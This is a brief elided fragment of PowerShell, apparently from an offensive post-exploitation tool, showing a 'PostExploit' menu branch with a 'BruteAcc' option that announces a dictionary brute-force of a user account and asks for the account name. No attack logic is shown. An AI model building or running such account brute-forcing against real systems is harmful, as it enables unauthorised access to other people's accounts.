  ...
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      If($choise -ieq "BruteAcc" -or $choise -ieq "Brute")
      {
         ...
         {
            Write-Host " Brute-Forcing User Account with dicionary .." -ForegroundColor Blue -BackgroundColor White;
            $UserAccountName = Read-Host " - Input Account Name";Write-Host "`n"
